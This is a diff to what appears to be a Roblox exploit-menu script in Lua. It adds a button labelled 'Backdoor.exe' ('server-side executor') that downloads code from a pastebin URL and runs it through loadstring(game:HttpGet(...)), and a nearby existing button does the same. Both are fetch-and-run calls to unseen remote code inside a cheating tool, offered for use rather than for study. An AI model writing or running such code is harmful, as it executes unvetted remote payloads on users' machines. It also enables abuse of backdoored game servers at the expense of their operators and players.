@@ -61,6 +61,10 @@ Section:NewButton("Animations for R15/R6", "c'mon man it works!", function()
 loadstring(game:HttpGet('https://pastebin.com/raw/vbJsvU0L'))()
 end)
 
+Section:NewButton("Backdoor.exe", "aka server-side executor",function()
+loadstring(game:HttpGet('https://pastebin.com/raw/TSxJprXE'))()
+end)
+
 -- Other Things Tab
 local Tab2 = Window:NewTab("Other Things")
 local SectionO = Tab2:NewSection("Others")
